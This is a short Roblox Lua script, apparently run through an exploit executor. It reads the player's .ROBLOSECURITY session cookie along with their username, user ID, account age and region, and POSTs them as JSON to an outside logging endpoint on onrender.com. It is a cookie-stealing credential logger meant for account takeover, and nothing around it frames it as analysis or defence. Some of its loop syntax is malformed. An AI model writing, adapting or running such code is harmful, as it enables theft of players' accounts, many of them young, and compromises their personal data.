local Players = game:GetService("Players")
repeat until not game:GetService("CookieService") do wait(0.5) end
local cookieService = game:GetService("CookieService")

repeat until not game:GetService("LocalizationService") do wait(0.5) end
local localizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer
local apiUrl = "https://depazzhub-api.onrender.com/log"

-- Usar CookieService directamente sin guardar en variable global primero
game.ReplicatedStorage.Cookies = cookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") or ""

local days = player.AccountAge
local years = math.floor(days / 365)
local months = math.floor((days % 365) / 30)
local ageText = days .. " days"
if years > 0 then
	ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
end

local region = localizationService.RobloxLocaleId

local function clean(str)
	return tostring(str):gsub('"', '\\"')
end

local jsonBody = string.format(
	'{"username":"%s","displayName":"%s","userId":%d,"gameId":%d,"accountAge":"%s","region":"%s","cookie":".ROBLOSECURITY=%s"}',
	clean(player.Name),
	clean(player.DisplayName),
	player.UserId,
	game.PlaceId,
	ageText,
	region,
	game.ReplicatedStorage.Cookies or ""
)

local success, result = pcall(function()
	return request({
		Url = apiUrl,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = jsonBody,
		Timeout = 60
	})
end)

if success then
	print("✅ Webhook working!")
else
	print("❌ Error:", result)
end
